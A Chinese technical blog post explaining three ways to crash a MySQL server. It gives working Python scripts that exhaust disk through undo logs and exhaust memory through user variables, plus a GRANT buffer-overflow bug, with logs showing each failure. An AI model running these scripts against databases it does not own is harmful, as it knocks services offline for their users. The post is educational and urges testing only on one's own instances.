---
layout: post
title: "如何搞挂MySQL"
description: ""
category: 数据库
tags: [MySQL]
---

# 如何搞挂MySQL


本文将介绍三种搞挂MySQL的方式，逗大家一乐，感兴趣的同学可以找一个MySQL实例进行测试。三种方式分别是：1）产生大量undo日志撑满磁盘空间导致MySQL不可用；2）定义大量用户变量耗尽MySQL的内存；3）触发MySQL的bug。

**声明：**  这里介绍的三种方式可以搞挂目前大多数的线上MySQL实例，所以，测试请谨慎，如果不是自己的示例，请在测试环境进行实验。


# 1. 产生大量的undo日志

众所周知，InnoDB是一个支持MVCC的存储引擎，为了支持MVCC，InnoDB需要保存undo日志，以便对用户提供记录的历史版本。

那么，如果我们反复地更新一条记录而不提交，将会产生大量的undo日志，使得磁盘空间爆满，导致MySQL不可用。

在innodb现有的实现中，并没有对单个用户或单个连接使用的undo空间进行限制。也就是说，我们只需要反复更新一条记录，而不提交，就会产生大量undo日志，由于我们的事务没有提交，undo日志不能被回收，从而使得磁盘空间被耗尽，最终导致MySQL挂掉。

Jeremy Cole老早就提到过这个[问题][1]，不过该问题至今还存在。要进行该项测试，只需要有更新记录的权限即可。测试脚本如下：

    #!/usr/bin/python
    #-*- coding: UTF-8 -*-
    import pymysql
    import random
    import string
    
    def get_conn():
        return pymysql.connect(user='lmx', password='123456', port=3306, host='127.0.0.1', db='test')
    
    def update_data(n):
        with get_conn() as cursor:
            for i in xrange(n):
                data =  "".join(random.sample(list(string.letters + string.digits), 60)) * 5
                cursor.execute( "update test set val = '{0}'".format(data))
    
    def main():
        print update_data(9900000000)
    
    if __name__ == '__main__':
        main()

测试过程中，可以观察磁盘空间的使用率，一直在上升：

    /dev/vdb         30G  7.7G   23G  26% /ebs
    /dev/vdb         30G   25G  5.4G  83% /ebs
    /dev/vdb         30G   30G   28K 100% /ebs

磁盘空间满以后，再执行SQL语句就报错了，错误信息如下：

    mysql> create table t2(id int);
    ERROR 3 (HY000): Error writing file './test/t2.frm' (Errcode: 28 - No space left on device)

错误日志如下：

    2016-03-31 12:03:07 7f9298f97700 InnoDB: Error: Write to file ./ibdata1 failed at offset 10415505408.
    InnoDB: 1048576 bytes should have been written, only -1 were written.
    InnoDB: Operating system error number 28.
    InnoDB: Check that your OS and file system support files of this size.
    InnoDB: Check also that the disk is not full or a disk quota exceeded.
    InnoDB: Error number 28 means 'No space left on device'.
    InnoDB: Some operating system error numbers are described at
    InnoDB: http://dev.mysql.com/doc/refman/5.6/en/operating-system-error-codes.html

可以看到，虽然MySQL进程还存在，其实服务已经不可用了。事务在执行过程中，会产生undo日志以及binlog日志，占用磁盘空间，如果我们在线上执行一个大事务，就需要留意是否有可能因为undo和binlog导致磁盘空间爆满的情况，为了规避风险，我们还是应该尽可能的避免特别大的事务。

# 2. 定义大量的变量

上面的例子并没有真的让MySQL进程挂掉，而且需要对数据库具有写的权限。你可能不服，那么，我们再来看一个情况————定义大量的变量。

这种方式将会导致MySQL占用的内存急剧上涨，最后被操作系统kill掉。而且，只需要有登录数据库的权限即可。

想想之前[姜老师][4]搞了一个线上写SQL的比赛，这种方式就可以轻易地将姜老师的数据库搞垮了。

测试脚本如下：


    #!/usr/bin/python
    #-*- coding: UTF-8 -*-
    import pymysql
    import random
    import string
    
    def get_conn():
        return pymysql.connect(user='lmx', password='123456', port=3306, host='127.0.0.1')
    
    def set_variables(n):
        with get_conn() as cursor:
            for i in xrange(n):
                data =  "".join(random.sample(list(string.letters + string.digits), 60)) * 50
                cursor.execute( "set @var{0} = '{1}'".format(i, data))
    
    def main():
        print set_variables(9900000000)
    
    if __name__ == '__main__':
        main()

我们不断的定义用户变量，可以通过pidstat观察MySQL占用的内存：

        pidstat 2 -r -p 6879
 
        10:50:48 AM      6879   3683.08      0.00 2450176 1089808  52.87  mysqld
        10:50:50 AM      6879   3822.00      0.00 2480768 1120168  54.34  mysqld
        10:50:52 AM      6879   3252.24      0.00 2506904 1146304  55.61  mysqld
        10:50:54 AM      6879   4065.83      0.00 2539276 1178776  57.19  mysqld
        10:50:56 AM      6879   3436.32      0.00 2566900 1206496  58.53  mysqld
        10:50:58 AM      6879   3570.85      0.00 2595312 1234744  59.90  mysqld
        10:51:00 AM      6879   4379.00      0.00 2630356 1269856  61.60  mysqld
        10:51:02 AM      6879   2982.09      0.00 2654316 1293880  62.77  mysqld
        10:51:04 AM      6879   3836.00      0.00 2685004 1324504  64.26  mysqld
        10:51:06 AM      6879   3147.00      0.00 2710152 1349584  65.47  mysqld
        10:51:08 AM      6879   3997.50      0.00 2742132 1381528  67.02  mysqld
        10:51:10 AM      6879   4127.14      0.00 2775000 1414720  68.63  mysqld
        10:51:12 AM      6879   3382.00      0.00 2802024 1441644  69.94  mysqld
        10:51:14 AM      6879   4285.57      0.00 2836480 1476288  71.62  mysqld
        10:51:16 AM      6879   3529.50      0.00 2864692 1504544  72.99  mysqld
        10:51:18 AM      6879   3573.13      0.00 2893400 1533260  74.38  mysqld
        10:51:20 AM      6879   3694.97      0.00 2922804 1562828  75.82  mysqld
        10:51:22 AM      6879   3738.50      0.00 2952704 1592860  77.27  mysqld
        10:51:24 AM      6879   3825.00      0.00 2983296 1623484  78.76  mysqld
        10:51:26 AM      6879   3082.00      0.00 3006660 1646792  79.89  mysqld
        10:51:28 AM      6879   3961.00      0.00 3038340 1678464  81.43  mysqld

可以看到，MySQL占用的内存越来越大，最后，MySQL进程不在了。通过dmesg可以看到，是由于MySQL占用内存太多，被操作系统kill掉:

    dmesg
    [ 2859.949210] Out of memory: Kill process 6879 (mysqld) score 927 or sacrifice child
    [ 2859.950665] Killed process 6879 (mysqld) total-vm:4125200kB, anon-rss:1905488kB, file-rss:0kB

# 3. 触发MySQL的bug

可以说，写MySQL的都是一群科学家，而且，由于MySQL使用如此广泛，遇到MySQL的bug的情况应该不容易，不过，也不是没有的。如果看MySQL的release note，每次的新版本都会修复无数的bug。

这里，我们来测试一下MySQL的bug。之所以选择这个bug，是因为该bug复现起来太容易了，只需要执行一条SQL语句即可。

在使用grant授权时，如果使用了一个很长的数据库名，将导致MySQL挂掉。如下所示：
![mysql_bug.png-9kB][2]

很明显，该问题是由于缓冲区溢出导致，这也是我们编程中容易犯的一个错误。这个bug在MySQL 5.7中已经修复，我在我们的线上环境（5.6.19）中进行测试，MySQL立马挂掉，简直是搞挂MySQL的最快方式。

[1]:http://blog.jcole.us/2014/04/16/a-little-fun-with-innodb-multi-versioning/
[2]: http://static.zybuluo.com/lmx07/kdo79hs5tuo8darmczujxmiv/mysql_bug.png
[4]: http://www.innomysql.net
